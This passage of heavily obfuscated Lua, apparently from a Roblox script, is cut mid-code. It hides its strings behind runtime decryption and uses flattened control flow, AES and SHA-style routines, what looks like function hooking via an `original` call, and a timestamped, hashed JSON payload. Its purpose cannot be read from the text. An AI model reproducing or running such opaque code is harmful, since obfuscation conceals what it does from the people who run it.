or(g<=0 or g~=g)and k<e)and 0b101100111-_ or 0xb9-_ end else e=e+d _=(d>0 and e>g or d<=0 and e<g or d~=d)and(h.ka[-0x76d4]or h:ma(0x9f858,0xb58,-0x76d4))or 0x306d/_ end elseif _<0b1000110 then if _>0x29 then if _<0b1000001 then n,p,r=0b1001,1,0x3c _=(r~=r or p>0 and n>r or(p<=0 or p~=p)and n<r)and 0b100111000-_ or 0x1f00/_ elseif _>0x41 then u,c,j=k[e],b[1][0b11][b[1][1]],1 o=u+j q=c[o]_,k[e]=h.ka[-0x772f]or h:na(0x5a46,0x59ba,-0x772f),q else s=s+r _=(r>0 and s>n or r<=0 and s<n or r~=r)and _+-0b110001 or h.ka[-0x7e17]or h:ma(0x12474c,0x2ecb,-0x7e17)end elseif _>=0x17 then if _<=0x17 then e=e+d _=(d>0 and e>g or d<=0 and e<g or d~=d)and 0x11b3/_ or 0x5e-_ else d=1 d,g=0b1000,n-d e,g=g%d,0 _=e==g and(h.ka[0x3161]or h:ma(0x29ee10,0x6d88,0x3161))or h.ka[-0x2cf6]or h:na(0x7f07,0x7e49,-0x2cf6)end elseif _>0b1000 then n={}r,s,n=0b1000,n,1 p=n _=(r~=r or p>0 and n>r or(p<=0 or p~=p)and n<r)and(h.ka[0x1d06]or h:na(0x4147,0x4109,0x1d06))or _+0b10100001 else o=1 c,o=n-o,0b100 q=c*o d,j=q+k,1 u,j=n-j,o o=u*j c=o+k _,q=h.ka[-0x2ba4]or h:na(0x2ba8,0x2b62,-0x2ba4),f[c]s[d]=q end elseif _>=0b1100010 then if _>=0b1101101 then if _<=0x6d then e,g=1,0b100 d=e _=(g~=g or d>0 and e>g or(d<=0 or d~=d)and e<g)and(h.ka[0x4bc3]or h:ma(0x53a5bf,0x6cb3,0x4bc3))or h.ka[-0x2f1a]or h:ma(0x37664,0xc7c,-0x2f1a)else e,c,k,n,q,g,d,p,r,f,s=0b100000,0b110110,0b10000,0b10,0b11011,0x40,0b10000000,0b1000,0b100,{},1 f[1],f[0b10],f[0b11],f[0b100],f[0b101],f[0b110],f[0b111],f[0b1000],f[0b1001],f[0b1010]=s,n,r,p,k,e,g,d,q,c s,v={},f f,n,s=s,e,1 r=s _=(n~=n or r>0 and s>n or(r<=0 or r~=r)and s<n)and(h.ka[-0b1011011]or h:na(0x653a,0x652a,-0b1011011))or h.ka[-0x7e17]or h:na(0x753d,0x74d9,-0x7e17)end elseif _<=0b1100010 then d,q,g,e=k[0b100],k[1],k[0b11],k[0b10]k[1]=e k[0b10]=g k[0b11]=d k[0b100]=q e,g=1,0b100 d=e _=(g~=g or d>0 and e>g or(d<=0 or d~=d)and e<g)and 0x5622/_ or h.ka[-0x3511]or h:ma(0x6b0f3,0x163f,-0x3511)else e,p,k=s,i.byte,i p=p(k,e)_,f[s]=0b10100101-_,p end elseif _<0b1000111 then k=k+g _=(g>0 and k>e or g<=0 and k<e or g~=g)and(h.ka[-0x1879]or h:ma(0x3e99f4,0x580e,-0x1879))or 0x230/_ elseif _<=0x47 then u=1 u,o=0b100,n-u c=o*u q,o=c+e,bit32 l,_,c=0b1001,h.ka[0x686f]or h:na(0x5dea,0x5dd3,0x686f),o[h.ka[-0x5f65]or h:la(h.V"<R<AX",h.V"UWN",-0x5f65)]l,t=u,n-l j=t*l u=j+e o,u=s[u],k[e]c=c(o,u)s[q]=c else _,c,u,j=h.ka[0x2b27]or h:na(0x7d7,0x736,0x2b27),b[1][0b11][b[1][1]],k[e],1 o=u+j q=c[o]k[e]=q end until false end end,V=function(h)local f,i,d,a,g f=string a,i=f.gsub,f.char i={[1]=0b10,[0b10]=i}i[0b11]=i a={[1]=0b10,[0b10]=a}a[0b11]=a d=bit32 f,g=d.rshift,d.band f={[1]=0b10,[0b10]=f}f[0b11]=f g={[1]=0b10,[0b10]=g}g[0b11]=g d=h:W{i,g,a,f}return d end,la=function(a,b,c,d)a.ka[d]=a.T(b,c)return a.ka[d]end,d=(function()local function m(i,j,k)if j>k then return end return i[j],m(i,j+1,k)end return function(o)return m(o[1],1,o[0b10])end end)(),oa=function(a,b,c,d)a.ka[d]=b+a.a(c,0x3e10)return a.ka[d]end,o=function(h)return function(i,a)local m,f,l,o,_,j,k,e,n,d,g _=h.ka[-0x75c]or h:ma(0x17b4c4,0x41f7,-0x75c)repeat if _<=0b10001000 then if _>0x5c then n=table l,n=n[h.ka[-0x7ac5]or h:la(h.V"2}r65Mz8",h.V"#3yP",-0x7ac5)],f l=h.c(l(n))return h.d(l)elseif _<=0b10001 then k=string o,e=k[h.ka[-0xb85]or h:la(h.V"QO{G=",h.V"r!o",-0xb85)],bit32 e,k,g,d=i.byte,e[h.ka[-0x5f65]or h:la(h.V"n~Ro#",h.V"^Z5",-0x5f65)],i,l _,e=h.ka[-0x503]or h:na(0x408f,0x3fa4,-0x503),e(g,d)g,m,d=a.byte,l,a g=h.c(g(d,m))k=h.c(k(e,h.d(g)))o=o(h.d(k))f[l]=o else l={}k,f,l=math,l,1 k,e,o=#i,#a,k[h.ka[-0x2ee9]or h:la(h.V"t*Nd",h.V"zy",-0x2ee9)]o=o(k,e)j,n=1,o _=(n~=n or j>0 and l>n or(j<=0 or j~=j)and l<n)and(h.ka[-0x616d]or h:ma(0x3d0678,0x72df,-0x616d))or h.ka[0x20d3]or h:na(0x66d6,0x66c5,0x20d3)end else l=l+j _=(j>0 and l>n or j<=0 and l<n or j~=j)and _+-0b1100011 or 0b11111100-_ end until false end end,P=function(h,b)return function()local i,g,d,f,a i,f,a=b[0b11][0b11][b[0b11][1]],b[0b10][0b11][b[0b10][1]],{}a[h.ka[0x38d5]or h:la(h.V"Sbt#",h.V"4F",0x38d5)]=f f=h.ka[-0x594a]or h:la(h.V"*>Bo(",h.V"Ac+",-0x594a)a[h.ka[-0x1fc0]or h:la(h.V"(ex(t{x$",h.V"Qjwe",-0x1fc0)]=f g,d={},h.ka[-0x57f6]or h:la(h.V"c^tWCX!w}+aRa9$Yv`8j",h.V"g87>P3(0I4",-0x57f6)g[h.ka[0x728d]or h:la(h.V"8I?z|u{$o;eY~VF",h.V"Rn)~P`dR",0x728d)]=d d=h.ka[-0x5ce7]or h:la(h.V"v#+r",h.V"fd",-0x5ce7)g[h.ka[0x6d5b]or h:la(h.V"L|Oox2UX!DeOecb6jkXUas",h.V"Pk<(7?m>4P",0x6d5b)]=d f=g a[h.ka[0x6268]or h:la(h.V"h_-~JwwJR",h.V"<<r0",0x6268)]=f d,f=b[1][0b11][b[1][1]],b[0b100][0b11][b[0b100][1]]g,f=f,f.JSONEncode f=f(g,d)a[h.ka[0x20d]or h:la(h.V"NtSPb",h.V"`3n",0x20d)]=f i=h.c(i(a))return h.d(i)end end,U=function(h,b)return function(i,a)local d,p,e,q,c,l,f,_,k,r,g,o,n _=0x6a while true do if _<0b10010101 then if _<=0x3c then if _>=0b100001 then if _<0x37 then return f elseif _>0b110111 then l=l+r _=r>0 and 0x54 or 0b100010111-_ else _=l>n and 0b100001 or 0x23aa/_ end elseif _>0b10111 then _,g=0b11100100,h.c(g(d,q))else k,e,g,p,d=b[0b10][0b11][b[0b10][1]],b[1][0b11][b[1][1]],i,b[0b11][0b11][b[0b11][1]],1 _,d=_+0xdb,l+d end elseif _<0x6a then _=l>n and _+-0b110011 or 0x12f-_ elseif _<=0b1101010 then f,k,l,p="",1,0,#i n,r=p-k,k _=n~=n and 0b100001 or 0b10011101 else _=l<n and 0xf15/_ or 0b10111 end elseif _<=0b11001000 then if _>=0b10100110 then if _<0xb9 then _=r~=r and _+-0b110001 or 0b10111001 elseif _<=0xb9 then _=r<=0 and 0b1110101 or 0b10111 else p=p(h.d(k))_,f=0b111100,f..p end elseif _<=0x95 then _=l<n and 0b100001 or 0xeb else _=r>0 and 0xd4-_ or 0x65ce/_ end elseif _<=0xeb then if _<0b11100100 then _=r<=0 and 0x95 or 0b111000110-_ elseif _<=0xe4 then _,k=_+-0x1c,h.c(k(e,h.d(g)))else _=r~=r and 0x21 or 0x17 end else e=e(g,d)d,g,q,o=a,b[1][0b11][b[1][1]],#a,#a _,c=_+-0b11010100,l%o q=q-c end end end end,H=function(w)return function(i)local o,n,v,x,d,k,t,p,f,s,q,l,g,_,r,c,m,j,e,a,h,y _=w.ka[0x1508]or w:na(0x39e4,0x39ab,0x1508)repeat if _>=0x3f then if _<=0x3f then _,s=0xca-_,0 else r=math r,n=18446744073709552000,r[w.ka[0x6f8b]or w:la(w.V"-e=cj$^",w.V"3%C",0x6f8b)]r=f/r n=n(r)p=18446744073709552000 q,e,r=string,"\128",f%p q,d,x="\0",q[w.ka[-0x31b1]or w:la(w.V"WOHT",w.V"76",-0x31b1)],s d=d(q,x)x=string o,q=bit32,x[w.ka[-0xb85]or w:la(w.V"Vy|Ge",w.V"#{m",-0xb85)]x,o,y=o[w.ka[0x73d1]or w:la(w.V"sT@$U2}}",w.V"IB(k",0x73d1)],n,0b11000 x=x(o,y)y=bit32 j,o=y,y[w.ka[-0xc47]or w:la(w.V"AMO+D",w.V"k9`",-0xc47)]y,t,j=j[w.ka[0x73d1]or w:la(w.V"aZ({_M?C",w.V"Ng)F",0x73d1)],0x10,n y=y(j,t)j=0b11111111 o=o(y,j)j=bit32 y,t=j[w.ka[-0xc47]or w:la(w.V"#8${t",w.V"H>L",-0xc47)],j t,j,l=n,t[w.ka[0x73d1]or w:la(w.V"!`RN)&C&",w.V"rmL|",0x73d1)],0b1000 j=j(t,l)t=0b11111111 y=y(j,t)t=bit32 l,j,t=0xff,t[w.ka[-0xc47]or w:la(w.V"G&(px",w.V"TUG",-0xc47)],n j=j(t,l)l=bit32 m,l,t=0x18,r,l[w.ka[0x73d1]or w:la(w.V"z~n01@iq",w.V"LYJ}",0x73d1)]t=t(l,m)m=bit32 l,a=m[w.ka[-0xc47]or w:la(w.V"sD`A2",w.V"=gI",-0xc47)],m m,h,a=a[w.ka[0x73d1]or w:la(w.V"@WN5+*G&",w.V"IkAE",0x73d1)],0x10,r m=m(a,h)a=0xff l=l(m,a)a=bit32 m,h=a[w.ka[-0xc47]or w:la(w.V"!K}@x",w.V"&7%",-0xc47)],a c,a,h=0b1000,h[w.ka[0x73d1]or w:la(w.V"CX$~$hl2",w.V"_u*6",0x73d1)],r a=a(h,c)h=0xff m=m(a,h)h=bit32 c,h,a=0b11111111,r,h[w.ka[-0xc47]or w:la(w.V"`&ai;",w.V"Hkk",-0xc47)]a=w.c(a(h,c))q=q(x,o,y,j,t,l,m,w.d(a))g=d..q k=e..g p=i..k return p end else s,v=0b1000,#i n,k,f=0x40,0b1001,v*s p,k=v+k,n r=p%k s=n-r _=s==n and(w.ka[0x575f]or w:ma(0x15b40f,0x5831,0x575f))or w.ka[-0x26fc]or w:na(0x5ad,0x522,-0x26fc)end until false end end,k=function(h,b)return function(i,a,f)local k,d,p,s,g,q,c,o,m,j,e,n,r n,s=f,b[0b110][0b11][b[0b110][1]]s=s(n)p,n={},b[0b10][0b11][b[0b10][1]]p[h.ka[0x726a]or h:la(h.V"`u6",h.V"lK",0x726a)]=a p[h.ka[0x9f2]or h:la(h.V"sUZ2aF5$f",h.V"fI-;",0x9f2)]=i k,g=tostring,math g,e=tick,g[h.ka[0x6f8b]or h:la(h.V"CW0@4G5",h.V"?mz",0x6f8b)]g=h.c(g())e=h.c(e(h.d(g)))k=k(h.d(e))p[h.ka[-0x7c88]or h:la(h.V"0tE",h.V"b^",-0x7c88)]=k g,e,k=0b1100,b[1][0b11][b[1][1]],b[0b100][0b11][b[0b100][1]]e=h.c(e(g))k=k(h.d(e))p[h.ka[0x643]or h:la(h.V"3?vLF2L",h.V"OJV",0x643)]=k r,n=n,n.JSONEncode n=n(r,p)r,p=b[0b111][0b11][b[0b111][1]],n r=r(p)k,p=0b1100,b[1][0b11][b[1][1]]p=p(k)k,e=b[0b110][0b11][b[0b110][1]],s..p k=k(e)q,e,g,d=p,b[0b101][0b11][b[0b101][1]],r,k e=e(g,d,q)g,d=b[0b110][0b11][b[0b110][1]],s..e g=g(d)q,d=0b10000,b[1][0b11][b[1][1]]d=d(q)o,m,q,c=s,d,b[0b11][0b11][b[0b11][1]],e..g q=q(c,o,m)j,m,o=q,b[0b100][0b11][b[0b100][1]],{}m=m(j)o.d=m j,m=d,b[0b100][0b11][b[0b100][1]]m=m(j)o.i=m m,j=b[0b100][0b11][b[0b100][1]],p m=m(j)o.n=m m,j=b[0b100][0b11][b[0b100][1]],g m=m(j)o.h=m m=h.ka[-0x5ce7]or h:la(h.V"X?1G",h.V"TL",-0x5ce7)o.v=m c=o return c end end,Q=function(e,b)return function()local _,a,c _=e.ka[0x3c63]or e:ma(0x3b97cc,0x7393,0x3c63)while true do if _>=0b10110101 then if _<=0b10110101 then a=task c=a[e.ka[0x25ae]or e:la(e.V"qwl@?",e.V"j?@",0x25ae)]c=c()_=c and 0x9cf6/_ or 0b10111101-_ else a=b[1][0b11][b[1][1]]a,c=true,a[e.ka[0x3537]or e:la(e.V"0UQk",e.V"Nd",0x3537)]_,c[e.ka[0x3791]or e:la(e.V"9e92^dU`w",e.V"9~M{",0x3791)]=e.ka[0x73f4]or e:ma(0x426d84,0x5df4,0x73f4),a a=b[1][0b11][b[1][1]]c,a=a[e.ka[-0x14ac]or e:la(e.V"D(Yc5l3NGlVL6*z7X",e.V"GW1Xtg=7",-0x14ac)],false c[e.ka[0x3791]or e:la(e.V"<BaRXj_<+",e.V"isGg",0x3791)]=a end elseif _>0b1000 then _=e.ka[0x73f4]or e:ma(0xa3ad8,0xe78,0x73f4)else return end end end end,N=function(h)return function(i,a)local j,g,c,k,f,_,d _=h.ka[-0x3864]or h:na(0x12c4,0x121f,-0x3864)while true do if _>0b10100101 then f=f+d _=(d>0 and f>g or d<=0 and f<g or d~=d)and(h.ka[-0xb0e]or h:na(0x563a,0x55d1,-0xb0e))or h.ka[-0x5e9]or h:na(0x5441,0x53d2,-0x5e9)elseif _>=0b1101111 then if _<=0x6f then _,c=0x5649/_,bit32 k,j,c=a[f],c[h.ka[-0x5f65]or h:la(h.V"EL0(0",h.V"EKU",-0x5f65)],i[f]j=j(c,k)i[f]=j else g,f=0b10000,1 d=f _=(g~=g or d>0 and f>g or(d<=0 or d~=d)and f<g)and(h.ka[-0xb0e]or h:ma(0x70ebd,0x1135,-0xb0e))or h.ka[-0x5e9]or h:na(0x3df4,0x3d85,-0x5e9)end else return end end end end,g=function(e,b)return function(c)local f,_,a _=e.ka[0x3136]or e:ma(0x4de04,0x3e4d,0x3136)repeat if _>=0x3c then if _>0x3c then a=true _,f,b[0b11][0b11][b[0b11][1]]=0x3a20/_,game,a a=f[e.ka[-0x37ea]or e:la(e.V"AO1JkF#",e.V"kyQ",-0x37ea)]b[0b10][0b11][b[0b10][1]],a=a,true b[1][0b11][b[1][1]]=a else f,a=c,original a=e.c(a(f))return e.d(a)end else f=b[0b11][0b11][b[0b11][1]]a=not f _=a and(e.ka[-0x75d2]or e:ma(0x78d148,0x7cb7,-0x75d2))or e.ka[-0x400c]or e:na(0x7532,0x74f6,-0x400c)end until false end end,I=function(h)return function(i,a)local j,c,f,g,d g=bit32 d,f=g,g[h.ka[0x2497]or h:la(h.V"SXD>",h.V"Is",0x2497)]d,g,j=i,d[h.ka[0x73d1]or h:la(h.V"b&r2;nqv",h.V"7yJh",0x73d1)],a g=g(d,j)j=bit32 d,j,c=j[h.ka[-0x3c79]or h:la(h.V"pa{UF9oz",h.V"sC&!",-0x3c79)],i,0x20 c=c-a d=h.c(d(j,c))f=h.c(f(g,h.d(d)))return h.d(f)end end,W=function(h,b)return function(i)local _,j,c,f,l,a,k,d _=0xd0 repeat if _<=0b11010010 then if _>=0b11010001 then if _<=0xd1 then f,d="~",0b101 l,_,d,f=f,_+0b100100,d-a,f.rep f=f(l,d)i=i..f else l,f=f,f.sub f=h.c(f(l,d,j))return h.d(f)end elseif _<=0b1011000 then k=0b101 c=k-a c,j=1,-c _,j=_+0b10011000,j-c else l,f=0b101,#i a,f=f%l,0 _=a>f and 0b11010001 or 0b11110101 end elseif _>0xf0 then d,j,l,f=".....",h:X{b[0b10],b[0b100],b[1]},i,b[0b11][0b11][b[0b11][1]]f=f(l,d,j)d,j=1,0 j=a>j _=j and 0x58 or 0x1e5-_ elseif _<=0b11011101 then _,j=0xd2,-1 else _=j and 0xc4e0/_ or _+-0x13 end until false end end,p=function(h)return function(i)local k,j,u,c,g,q,p,d,e,v,o,l,_,n,r,t,f,s _=h.ka[-0x54f8]or h:ma(0x3eacf6,0x5109,-0x54f8)repeat if _<=0b10110100 then if _<=0b1011001 then if _>=0b100111 then if _<=0x55 then if _<=0x27 then g={}g,e,d=1,g,0b101 q=g _=(d~=d or q>0 and g>d or(q<=0 or q~=q)and g<d)and(h.ka[0x54e6]or h:ma(0xb4e88,0x6f54,0x54e6))or h.ka[-0x498e]or h:ma(0x1b5de1,0x2d33,-0x498e)else g,d=1,k q=g _=(d~=d or q>0 and g>d or(q<=0 or q~=q)and g<d)and _+0b1100111 or h.ka[0x6c28]or h:ma(0x46d50e,0x65df,0x6c28)end else g=g+q _=(q>0 and g>d or q<=0 and g<d or q~=q)and 0b100010101-_ or h.ka[0x6c28]or h:na(0x6b7a,0x6ac8,0x6c28)end elseif _>0b11010 then g=g+q _=(q>0 and g>d or q<=0 and g<d or q~=q)and 0x35a/_ or h.ka[-0x498e]or h:ma(0x3a8a90,0x60b0,-0x498e)else g=0 _=k>g and(h.ka[0x1720]or h:na(0x30e,0x2b9,0x1720))or 0b11010110-_ end elseif _<0b10110010 then if _<=0b10001110 then g=0x100 e=g^k _,p=h.ka[-0x49c6]or h:na(0x67d2,0x67ab,-0x49c6),p*e else u,o=1,#e o,c,l=h.ka[-0x6776]or h:la(h.V"<^PEEsCM-9b|Y?VyY+!*<uDBwRyZx_DlrB$4ig}AW$ICa&J%4U>q)Yv)2;U}udN|!UR;aCu~*dqJtsU@M1w;~eoS_1P8ko3H<<A*ZaeZ)s{",h.V"FOEPCaj)12vN9!gM_p!DVP&RZbRAtpc%mW1vG^`88cxH)L!8ID&eZ",-0x6776),o+u,0x55 l,t=u,p%l j,l=t+l,0b1010101 t,l=p%l,u t,u,o=t+l,o,o.sub o=o(u,j,t)e[c]=o _,o=0xbc-_,math c,o=o[h.ka[0x6f8b]or h:la(h.V"MP5u@Q2",h.V"G9v",0x6f8b)],0x55 o=p/o c=c(o)p=c end elseif _<=0b10110010 then _,c,o=h.ka[-0x6c9e]or h:ma(0x10bb2,0x302,-0x6c9e),#e,""e[c]=o else _,q=0x918c/_,0x100 o,d,q,c=k,p*q,r.byte,r q=q(c,o)p=d+q end elseif _>0xc8 then if _>0xd6 then f=f+n _=(n>0 and f>s or n<=0 and f<s or n~=n)and 0b111000101-_ or h.ka[0xb63]or h:ma(0x56e7a4,0x67f6,0xb63)elseif _>0b11001111 then e,k=0b11,f p,r,e=i,i.sub,f+e r=r(p,k,e)e,p,k=#r,0,1 g=k _=(e~=e or g>0 and k>e or(g<=0 or g~=g)and k<e)and 0x199-_ or h.ka[-0x4a25]or h:na(0x7718,0x7664,-0x4a25)else k=k+g _=(g>0 and k>e or g<=0 and k<e or g~=g)and 0x192-_ or 0b110000011-_ end elseif _<=0xc6 then if _<=0xc3 then if _>0xbc then g,e=#r,0b100 e,k=0,e-g _=k>e and 0x151-_ or 0xea-_ else d,q=#v,1 q,g=table,d+q q,d=e,q[h.ka[-0x7ac5]or h:la(h.V"n13diaXb",h.V"ND%t",-0x7ac5)]d=d(q)_,d,q=0b110111001-_,d.reverse,d d=d(q)v[g]=d end else f={}v,f,n,s=f,1,0b100,#i _=(s~=s or n>0 and f>s or(n<=0 or n~=n)and f<s)and(h.ka[0x2661]or h:ma(0x272900,0x3220,0x2661))or h.ka[0xb63]or h:na(0x1259,0x1183,0xb63)end else s=table s,f=v,s[h.ka[-0x7ac5]or h:la(h.V"X*XtRIeY",h.V"2v`a",-0x7ac5)]f=h.c(f(s))return h.d(f)end until false end end,T=function(h)local a,f,g,c g=string a,g,c=g.byte,bit32,g.char f=g.bxor c={[1]=0b10,[0b10]=c}c[0b11]=c a={[1]=0b10,[0b10]=a}a[0b11]=a f={[1]=0b10,[0b10]=f}f[0b11]=f g=h:U{a,f,c}return g end,ka={},J=function(h)return function(i)local q,g,a,o,j,_,p,e,s,k,c,f,n,t,d,r,m _=h.ka[0x6c58]or h:ma(0x1f69e0,0x3243,0x6c58)repeat if _>=0xa0 then if _<=0b10100000 then f,a,s=1,h:O(),0b100 n=f _=(s~=s or n>0 and f>s or(n<=0 or n~=n)and f<s)and(h.ka[-0x5e9]or h:ma(0x19c9e6,0x3b7a,-0x5e9))or h.ka[-0x7e17]or h:ma(0x2e950,0x774,-0x7e17)else f=f+n _=(n>0 and f>s or n<=0 and f<s or n~=n)and 0b100101100-_ or 0b100100001-_ end elseif _<=0x64 then r,d=i[f],0b100 g=f+d d,p=0b1000,i[g]g=f+d d,k=0b1100,i[g]g=f+d e,d=i[g],bit32 d,q,g,c=a,0b10,d[h.ka[-0x5f65]or h:la(h.V"{?+r}",h.V"t(*",-0x5f65)],r d=d(q,c)q,o,c=a,p,0b11 q=q(c,o)c,o=k,e g=g(d,q,c,o)i[f]=g d=0b100 q,g=bit32,f+d m,d,o,c,q=p,q[h.ka[-0x5f65]or h:la(h.V"RdZN*",h.V"3pW",-0x5f65)],0b10,a,r c=c(o,m)o,j,m=a,k,0b11 o=o(m,j)m=e d=d(q,c,o,m)i[g]=d d=0b1000 g,q=f+d,bit32 c,q,m,j,o,d=p,r,0b10,k,a,q[h.ka[-0x5f65]or h:la(h.V"@Z|mO",h.V"oRR",-0x5f65)]o=o(m,j)t,j,m=e,0b11,a _,m=_+0b1011001,m(j,t)d=d(q,c,o,m)i[g]=d d=0b1100 g,q=f+d,bit32 q,c,d,o=a,0b11,q[h.ka[-0x5f65]or h:la(h.V"6C@rk",h.V"TyX",-0x5f65)],r q=q(c,o)c,t,j,o,m=p,e,0b10,k,a m=m(j,t)d=d(q,c,o,m)i[g]=d else return end until false end end,G=function(h)return function(i,a)local g,f,d d,g=a[h.ka[-0x38cb]or h:la(h.V"?Emf",h.V"o&",-0x38cb)],i[h.ka[-0x38cb]or h:la(h.V"2^tF",h.V"dj",-0x38cb)]f=g>d return f end end,A=function(w)return function(i,v,f)local k,m,h,z,B,l,D,j,r,d,a,s,t,_,n,C,g,y,o,x,c,b,u,e B=w.ka[-0x3138]or w:ma(0x5cc40c,0x5e3d,-0x3138)while true do if B>=0x87 then if B>=0b11001011 then if B>0b11110010 then if B>0xfc then t,l,m=k,y,j t(l,m)l,t=0b1101,1 m=t B=(l~=l or m>0 and t>l or(m<=0 or m~=m)and t<l)and 0b100010000-B or 0x7a85/B else l,k,r,h,d,e,z,o,x,m,y,D,n,a,t,j,C=0b11111110,0b1110111,0x63,0b1110110,0x6b,0b1111011,0b11110010,0b110000,0b11000101,0b11010111,1,0x6f,{},0xab,0x2b,0x67,0b1111100 n[1],n[0b10],n[0b11],n[0b100],n[0b101],n[0b110],n[0b111],n[0b1000],n[0b1001],n[0b1010],n[0b1011],n[0b1100],n[0b1101],n[0b1110],n[0b1111],n[0b10000]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h k,z,d,l,o,e,D,C,r,m,x,a,t,y,j,h=0xc9,0b11111010,0b1011001,0x9c,0b10101101,0x7d,0b1000111,0b10000010,0b11001010,0b10100100,0b11110000,0x72,0b10101111,0xd4,0b10100010,0b11000000 n[0b10001],n[0x12],n[0b10011],n[0x14],n[0x15],n[0x16],n[0b10111],n[0x18],n[0b11001],n[0x1a],n[0x1b],n[0x1c],n[0x1d],n[0x1e],n[0b11111],n[0x20]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h a,z,h,d,x,o,t,j,e,D,l,C,r,y,k,m=0b110001,0b110110,0b10101,0b111111,0xcc,0x34,0xf1,0xe5,0b100110,0b11110111,0b1110001,0b11111101,0xb7,0b10100101,0b10010011,0xd8 n[0b100001],n[0b100010],n[0x23],n[0b100100],n[0x25],n[0b100110],n[0b100111],n[0x28],n[0b101001],n[0b101010],n[0b101011],n[0b101100],n[0b101101],n[0b101110],n[0x2f],n[0x30]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h e,r,d,t,o,j,D,y,k,m,h,C,x,l,a,z=0xc3,0b100,0b10010110,0xe2,0b111,0x80,0b101,0x12,0b100011,0x27,0x75,0b11000111,0x9a,0xeb,0xb2,0x18 n[0b110001],n[0x32],n[0x33],n[0x34],n[0x35],n[0x36],n[0x37],n[0x38],n[0x39],n[0x3a],n[0b111011],n[0b111100],n[0x3d],n[0b111110],n[0x3f],n[0b1000000]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h y,t,o,C,a,z,x,e,r,j,h,d,l,m,k,D=0b111011,0xb3,0b1010010,0x83,0x2f,0b11011,0xa0,0b11010,0b1001,0xd6,0x84,0x6e,0b101001,0b11100011,0x2c,0x5a n[0b1000001],n[0x42],n[0b1000011],n[0b1000100],n[0b1000101],n[0b1000110],n[0x47],n[0b1001000],n[0x49],n[0x4a],n[0x4b],n[0x4c],n[0x4d],n[0x4e],n[0x4f],n[0b1010000]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h l,e,h,d,o,t,k,x,j,m,D,r,a,z,y,C=0b1001010,0b11101101,0b11001111,0b11111100,0b1101010,0x39,0,0b1011011,0xbe,0x4c,0xb1,0x53,0x58,0b100000,0b11001011,0xd1 n[0b1010001],n[0b1010010],n[0b1010011],n[0b1010100],n[0x55],n[0x56],n[0b1010111],n[0b1011000],n[0b1011001],n[0x5a],n[0b1011011],n[0x5c],n[0x5d],n[0x5e],n[0x5f],n[0x60]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h l,e,r,D,y,h,C,z,k,d,a,o,j,m,x,t=0x50,0xfb,0b11010000,0b110011,0b11111001,0b10101000,0xef,0b1000011,0xaa,0b1001101,0x9f,0b1000101,0b10,0b111100,0b10000101,0x7f n[0x61],n[0x62],n[0b1100011],n[0x64],n[0b1100101],n[0b1100110],n[0b1100111],n[0b1101000],n[0b1101001],n[0x6a],n[0b1101011],n[0b1101100],n[0b1101101],n[0x6e],n[0x6f],n[0x70]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h r,D,e,z,a,y,k,h,j,x,d,o,t,C,m,l=0b1010001,0b111000,0x8f,0b10010010,0b11110011,0xb6,0x40,0b11010010,0b11011010,0xf5,0b10011101,0b10111100,0x21,0b10100011,0xff,0x10 n[0b1110001],n[0x72],n[0b1110011],n[0b1110100],n[0b1110101],n[0x76],n[0b1110111],n[0b1111000],n[0x79],n[0b1111010],n[0x7b],n[0x7c],n[0b1111101],n[0x7e],n[0b1111111],n[0x80]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h a,o,h,d,m,y,C,j,x,k,z,r,e,D,t,l=0x19,0b11000100,0x73,0b10010111,0b1011101,0b10100111,0b1100,0x7e,0x17,0x13,0b1011111,0b11001101,0xec,0b1000100,0x3d,0x64 n[0x81],n[0x82],n[0b10000011],n[0x84],n[0b10000101],n[0b10000110],n[0b10000111],n[0b10001000],n[0x89],n[0x8a],n[0b10001011],n[0x8c],n[0x8d],n[0x8e],n[0x8f],n[0b10010000]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h o,x,d,D,z,h,t,e,l,C,m,r,a,y,k,j=0b1000110,0b10001000,0b101010,0x90,0x22,0b11011011,0b10100,0xdc,0xde,0x81,0b1011110,0x60,0b1011,0xee,0b1001111,0b10111000 n[0b10010001],n[0b10010010],n[0x93],n[0x94],n[0x95],n[0b10010110],n[0b10010111],n[0b10011000],n[0x99],n[0x9a],n[0x9b],n[0b10011100],n[0b10011101],n[0x9e],n[0b10011111],n[0b10100000]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h e,C,x,o,r,l,k,a,z,D,h,t,d,y,j,m=0b1010,0x32,0b1011100,0xc2,0b11100000,0x91,0b111010,0xe4,0b1001001,0b100100,0b1111001,0b1100010,0b110,0b11010011,0b10101100,0b10010101 n[0b10100001],n[0xa2],n[0xa3],n[0xa4],n[0xa5],n[0xa6],n[0xa7],n[0b10101000],n[0b10101001],n[0xaa],n[0xab],n[0b10101100],n[0b10101101],n[0b10101110],n[0xaf],n[0b10110000]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h D,t,e,m,h,j,x,o,d,l,C,y,k,a,r,z=0x4e,0b11101010,0b1101101,0x7a,0b1000,0xf4,0xa9,0b1101100,0b11010101,0b1100101,0xc8,0b1010110,0b110111,0b10101110,0xe7,0x8d n[0xb1],n[0xb2],n[0b10110011],n[0xb4],n[0xb5],n[0b10110110],n[0b10110111],n[0xb8],n[0xb9],n[0xba],n[0b10111011],n[0xbc],n[0xbd],n[0b10111110],n[0b10111111],n[0xc0]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h e,C,k,h,a,x,z,j,r,t,D,o,m,l,d,y=0x2e,0x78,0x25,0b10001010,0x8b,0xc6,0x1c,0x74,0b10111010,0x1f,0b10110100,0b11101000,0b10111101,0x4b,0b10100110,0b11011101 n[0xc1],n[0b11000010],n[0xc3],n[0b11000100],n[0b11000101],n[0b11000110],n[0xc7],n[0xc8],n[0b11001001],n[0xca],n[0xcb],n[0b11001100],n[0b11001101],n[0b11001110],n[0xcf],n[0b11010000]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h y,C,j,k,z,x,m,d,t,h,e,l,a,o,D,r=0b110101,0b111110,0b1010111,0xb5,0x48,0b1110,0xc1,0b11,0xb9,0x9e,0b1100110,0b10000110,0b11101,0b1100001,0b11110110,0b1110000 